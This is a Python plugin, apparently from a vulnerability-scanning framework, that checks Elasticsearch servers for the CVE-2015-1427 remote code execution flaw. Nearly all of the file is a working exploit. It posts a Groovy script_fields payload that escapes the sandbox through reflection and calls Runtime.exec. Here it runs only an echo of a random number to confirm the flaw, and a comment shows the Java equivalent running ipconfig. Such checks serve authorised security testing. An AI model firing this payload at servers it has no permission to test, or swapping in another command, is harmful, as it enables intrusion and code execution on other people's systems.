#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

import random
from lib.core.enums import ServicePortMap
from lib.util.aiohttputil import ClientSession
from script import BaseScript

class Script(BaseScript):

    """
    elasticsearch rce (CVE-2015-1427)
    """
    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.ELASTICSEARCH

    async def prove(self):
        '''
        其中JAVA等价于：
        String s1 = new java.util.Scanner(Runtime.getRuntime().exec("ipconfig").getInputStream()).useDelimiter("\\A").next();
        //A means "start of string", and \z means "end of string".
        String s2  = new java.util.Scanner(Runtime.getRuntime().exec("ipconfig").getInputStream()).next();
        System.out.println(s1)
        '''
        if self.base_url:
            ran = str(random.randint(100000, 999999))
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            _data = '''
            {
                "size":1,
                "script_fields": {
                    "test#": {
                        "script":
                            "java.lang.Math.class.forName(\\"java.io.BufferedReader\\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"echo '''+ ran + '''\\").getInputStream())).readLines()",
                        "lang": "groovy"
                    }
                }
            }
            '''
            async with ClientSession() as session:
                url = self.base_url + '_search?pretty'
                async with session.post(url=url, headers=headers, data=_data) as res:
                    if res != None:
                        text = await res.text()
                        if ran in text:
                            yield url
